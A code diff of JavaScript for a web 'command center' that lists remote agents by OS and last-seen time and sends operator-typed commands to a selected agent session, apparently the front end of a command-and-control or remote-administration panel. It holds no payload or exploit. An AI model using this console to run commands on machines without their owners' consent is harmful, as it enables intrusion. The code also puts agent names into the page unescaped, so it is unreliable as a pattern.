@@ -97,16 +97,26 @@ function updateCommandCenter() {
             const agentList = document.getElementById('agent-list');
             if (!agentList) return;
 
+            // Sort agents by last seen
+            agents.sort((a, b) => new Date(b.last_seen) - new Date(a.last_seen));
+
             agentList.innerHTML = agents.map(agent => `
                 <div class="agent-card ${currentAgent === agent.id ? 'active' : ''}" 
                      onclick="selectAgent(${agent.id})">
-                    <div class="status-badge ${isAgentActive(agent.last_seen) ? 'online' : 'offline'}"></div>
-                    <div class="agent-info">
-                        <div class="agent-name">${agent.alias || `Agent_${agent.id}`}</div>
-                        <div class="agent-os">${agent.os_type || 'Unknown'}</div>
+                    <div class="agent-card-header">
+                        <div class="status-badge ${isAgentActive(agent.last_seen) ? 'online' : 'offline'}"></div>
+                        <div class="agent-info">
+                            <div class="agent-name">${agent.alias || `Agent_${agent.id}`}</div>
+                            <div class="agent-os">${agent.os_type || 'Unknown'}</div>
+                        </div>
                     </div>
                 </div>
             `).join('');
+
+            // If no agent is selected but we have agents, select the first one
+            if (!currentAgent && agents.length > 0) {
+                selectAgent(agents[0].id);
+            }
         });
 }
 
@@ -182,14 +192,94 @@ function commandAgent(agentId) {
 
 function selectAgent(agentId) {
     currentAgent = agentId;
+    
+    // Update UI
     document.querySelectorAll('.agent-card').forEach(card => {
-        card.classList.toggle('active', card.getAttribute('data-id') == agentId);
+        card.classList.toggle('active', card.getAttribute('onclick').includes(agentId));
     });
     
     const terminal = document.querySelector('.agent-terminal');
     const noAgentMessage = document.querySelector('.no-agent-selected');
     
-    terminal.style.display = 'flex';
-    noAgentMessage.style.display = 'none';
-    document.getElementById('terminal-input').focus();
+    if (terminal && noAgentMessage) {
+        terminal.style.display = 'flex';
+        noAgentMessage.style.display = 'none';
+        
+        // Clear terminal output
+        const output = document.getElementById('terminal-output');
+        if (output) {
+            output.innerHTML = `Connected to Agent_${agentId}\n`;
+        }
+        
+        // Focus input
+        const input = document.getElementById('terminal-input');
+        if (input) {
+            input.focus();
+        }
+    }
+}
+
+// Add command handling
+document.addEventListener('DOMContentLoaded', function() {
+    const terminalInput = document.getElementById('terminal-input');
+    if (terminalInput) {
+        terminalInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                const command = this.value.trim();
+                if (!command) return;
+                
+                if (!currentAgent) {
+                    appendToTerminal('No agent selected', 'error');
+                    return;
+                }
+                
+                // Add command to history
+                commandHistory.unshift(command);
+                historyIndex = -1;
+                
+                // Show command in terminal
+                appendToTerminal(`$ ${command}`, 'command');
+                
+                // Send command to server
+                fetch('/api/send_command', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        session_id: currentAgent,
+                        command: command
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.error) {
+                        appendToTerminal(data.error, 'error');
+                    } else {
+                        appendToTerminal(data.output);
+                    }
+                })
+                .catch(error => {
+                    appendToTerminal(`Error: ${error.message}`, 'error');
+                });
+                
+                this.value = '';
+            }
+        });
+    }
+    
+    // Start periodic updates
+    updateCommandCenter();
+    setInterval(updateCommandCenter, 5000);
+});
+
+function appendToTerminal(text, type = 'output') {
+    const terminal = document.getElementById('terminal-output');
+    if (!terminal) return;
+    
+    const div = document.createElement('div');
+    div.className = `terminal-${type}`;
+    div.textContent = text;
+    terminal.appendChild(div);
+    terminal.scrollTop = terminal.scrollHeight;
 } 
